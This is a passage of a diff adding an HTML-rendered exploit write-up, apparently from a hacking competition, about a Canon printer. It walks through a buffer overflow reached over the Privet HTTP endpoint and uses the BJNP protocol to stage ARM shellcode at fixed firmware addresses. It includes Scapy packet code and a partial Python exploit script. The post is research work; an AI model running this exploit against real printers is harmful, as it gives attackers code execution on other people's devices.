+    &lt;span class="s2"&gt;&amp;quot;Content-type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;application/json&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="s2"&gt;&amp;quot;Accept&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;text/plain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="s2"&gt;&amp;quot;X-Privet-Token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPConnection&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;192.168.1.100&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/privet/register&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;To confirm that the exploit was extremely reliable, we simply jumped to a debug function's entry point (which printed information to the serial console) and observed it worked consistently — though the printer rebooted afterwards because we hadn't cleaned the stack. &lt;/p&gt;
+&lt;p&gt;With this out of the way, we now need to work on writing a useful exploit. After reaching out to the organizers to learn more about their expectations regarding the proof of exploitation, we decided to show a custom image on the printer's LCD screen.&lt;/p&gt;
+&lt;p&gt;To do so, we could basically:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Store our exploit in the buffer used to trigger the overflow and jump into it,&lt;/li&gt;
+&lt;li&gt;Find another buffer we controlled and jump into it,&lt;/li&gt;
+&lt;li&gt;Rely only on return-oriented programming.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Though the first method would have been possible (we found a convenient &lt;code&gt;add r3, r3, #0x103 ; bx r3&lt;/code&gt; gadget), we were limited by the size of the buffer itself, even more so because parts of it were being rewritten in the function's body. Thus, we decided to look into the second option by checking other protocols supported by the printer.&lt;/p&gt;
+&lt;h2 id="bjnp"&gt;BJNP&lt;/h2&gt;
+&lt;p&gt;One of the supported protocols is BJNP, which was conveniently &lt;a href="https://www.synacktiv.com/sites/default/files/2021-06/thcon2021_canon_printer.pdf"&gt;exploited&lt;/a&gt; by Synacktiv ninjas on a different printer, accessible on UDP port &lt;code&gt;8611&lt;/code&gt;.
+&lt;a href="https://github.com/bitwiseworks/cups-bjnp-os2"&gt;This project&lt;/a&gt; adds a BJNP backend for CUPS, and the protocol itself is also handled &lt;a href="https://www.wireshark.org/docs/dfref/b/bjnp.html"&gt;by Wireshark&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;In our case, BJNP is very useful: it can handle sessions and allows the client to store data (up to &lt;code&gt;0x180&lt;/code&gt; bytes) on the printer for the duration of the session, which means we can precisely control until when our payload will remain available in memory. Moreover, this data is stored in the field of a global structure, which means it is always located at the same address for a given firmware. For the sake of our exploit, we reimplemented parts of the protocol using
+&lt;a href="https://scapy.net"&gt;Scapy&lt;/a&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;scapy.packet&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Packet&lt;/span&gt;
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;scapy.fields&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+    &lt;span class="n"&gt;EnumField&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;ShortField&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;StrLenField&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;BitEnumField&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;FieldLenField&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;StrFixedLenField&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;BJNPPkt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Packet&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;BJNP Packet&amp;quot;&lt;/span&gt;
+
+    &lt;span class="n"&gt;BJNP_DEVICE_ENUM&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Client&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Printer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Scanner&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="n"&gt;BJNP_COMMAND_ENUM&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="mh"&gt;0x000&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GetPortConfig&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x201&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GetNICInfo&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x202&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NICCmd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x210&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SessionStart&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x211&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SessionEnd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x212&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GetSessionInfo&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x220&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;DataRead&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x221&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;DataWrite&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x230&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GetDeviceID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x232&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;CmdNotify&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x240&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;AppCmd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="n"&gt;BJNP_ERROR_ENUM&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="mh"&gt;0x8200&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Invalid header&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x8300&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Session error&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="mh"&gt;0x8502&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Session already exists&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="n"&gt;fields_desc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
+        &lt;span class="n"&gt;StrFixedLenField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;magic&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;MFNP&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+        &lt;span class="n"&gt;BitEnumField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;device&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;enum&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;BJNP_DEVICE_ENUM&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+        &lt;span class="n"&gt;BitEnumField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;cmd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;enum&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;BJNP_COMMAND_ENUM&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+        &lt;span class="n"&gt;EnumField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;err_no&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;enum&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;BJNP_ERROR_ENUM&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;!H&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+        &lt;span class="n"&gt;ShortField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;seq_no&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+        &lt;span class="n"&gt;ShortField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sess_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+        &lt;span class="n"&gt;FieldLenField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;body_len&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length_of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;body&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;!I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+        &lt;span class="n"&gt;StrLenField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;body&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length_from&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;pkt&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;pkt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;body_len&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+    &lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;For our version of the firmware, the BJNP structure is located at &lt;code&gt;0x46F2B294&lt;/code&gt; and the session data sent by the client is stored at offset &lt;code&gt;0x24&lt;/code&gt;. We also want our payload to run in thumb mode to reduce its size, which means we need to jump to an odd address. All in all, we can simply overwrite the &lt;code&gt;pc&lt;/code&gt; register with
+&lt;code&gt;0x46F2B294+0x24+1=0x46F2B2B9&lt;/code&gt; in our original payload to reach the BJNP session buffer.&lt;/p&gt;
+&lt;h2 id="initial-poc"&gt;Initial PoC&lt;/h2&gt;
+&lt;p&gt;Quick recap of the exploitation strategy:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Start a BJNP session and store our exploit in the session data,&lt;/li&gt;
+&lt;li&gt;Exploit the buffer overflow to jump in the session buffer,&lt;/li&gt;
+&lt;li&gt;Close the BJNP session to remove our exploit from memory once it ran.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To demonstrate this, we can jump to the function which disables the energy save mode on the printer (and wakes the screen up, which is useful to check if it actually worked). In our firmware, it is located at &lt;code&gt;0x413054D8&lt;/code&gt;, and we simply need to set the &lt;code&gt;r0&lt;/code&gt; register to &lt;code&gt;0&lt;/code&gt; before calling it:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x54D8&lt;/span&gt;
+&lt;span class="nf"&gt;movt&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x4130&lt;/span&gt;
+&lt;span class="nf"&gt;blx&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;To avoid the printer rebooting, we can also fix the &lt;code&gt;r0&lt;/code&gt; and &lt;code&gt;lr&lt;/code&gt; registers to
+restore the original flow:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xEBA0&lt;/span&gt;
+&lt;span class="nf"&gt;movt&lt;/span&gt; &lt;span class="no"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x40DE&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;lr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r1&lt;/span&gt;
+&lt;span class="nf"&gt;bx&lt;/span&gt; &lt;span class="no"&gt;lr&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Putting it all together, here is an exploit which does just that:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;http.client&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;store_payload&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mh"&gt;0x180&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ne"&gt;ValueError&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+        &lt;span class="s2"&gt;&amp;quot;Payload too long: &lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s2"&gt; is greater than &lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mh"&gt;0x180&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="n"&gt;pkt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BJNPPkt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+        &lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x210&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="n"&gt;seq_no&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="n"&gt;sess_id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x180&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;))),&lt;/span&gt;
+    &lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;pkt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;show2&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pkt&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+    &lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BJNPPkt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;res&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;show2&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+    &lt;span class="c1"&gt;# The printer should return a valid session ID&lt;/span&gt;
+    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sess_id&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ne"&gt;ValueError&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Failed to create session&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;cleanup_payload&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;pkt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BJNPPkt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+        &lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x211&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="n"&gt;seq_no&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="n"&gt;sess_id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;pkt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;show2&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pkt&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+    &lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BJNPPkt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;res&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;show2&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
